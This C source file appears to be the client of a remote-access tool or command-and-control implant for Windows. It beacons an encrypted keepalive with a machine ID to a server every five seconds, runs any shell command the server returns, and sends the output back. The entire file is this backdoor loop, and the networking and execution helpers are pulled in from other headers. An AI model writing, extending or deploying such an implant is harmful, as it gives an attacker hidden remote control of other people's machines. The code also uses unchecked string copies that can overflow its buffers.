#include "crypt.h"
#include "comm.h"
#include "capabilities/shell.h"
#include "protocol.h"
#include "util.c"
#include <windows.h>
#include <stdio.h>

/**
 * This function will run the keepalive loop that looks for new commands and notifies the server that the client is alive.
 */
int main(){
    char current_command[512];
    memset(current_command, 0, sizeof(current_command));
    strcpy(current_command, commands[CMD_KEEPALIVE]);
    char result_buffer[512];
    char output[600];
    char uuidBuffer[10];
    get_unique_id(uuidBuffer);
    printf("unique buffer: %s\n", uuidBuffer);
    printf("Current command: %s\n", current_command);
    strcat(current_command, uuidBuffer);
    printf("Current command after concat: %s\n", current_command);
    strcat(current_command, "\n");

    while(1){
        char* encrypted_command = encrypt(current_command);
        printf("Encrypted Command: %s\n",encrypted_command);
        int failure = send_and_receive(encrypted_command, result_buffer, 512);
        strcpy(current_command, commands[CMD_KEEPALIVE]);
        strcat(current_command, uuidBuffer);
        strcat(current_command, "\n");

        if (failure != 0){
            printf("FAILURE\n");
        }
        else {
            printf("Content received: %s\n",result_buffer);
            char* result_commands[2];
            parse_data(result_buffer, result_commands);
            printf("Parsed Command: %s\n",result_commands[0]);
            printf("Parsed Arguments: %s\n", result_commands[1]);
            if (strcmp(result_commands[0], commands[CMD_SHELL]) == 0){
                run_command(result_commands[1], output, 600);
                char shell_cmd[512] = "shell_exec ";
                strcat(shell_cmd, uuidBuffer);
                strcat(shell_cmd, "\n");
                strcat(shell_cmd, output);
                printf("%s\n",shell_cmd);
                strcpy(current_command, shell_cmd);
                memset(output, 0, 512);
            }
        }
        // Resetting all the buffers to null.
        memset(result_buffer, 0, sizeof(result_buffer));
        


        Sleep(5000);
    }


}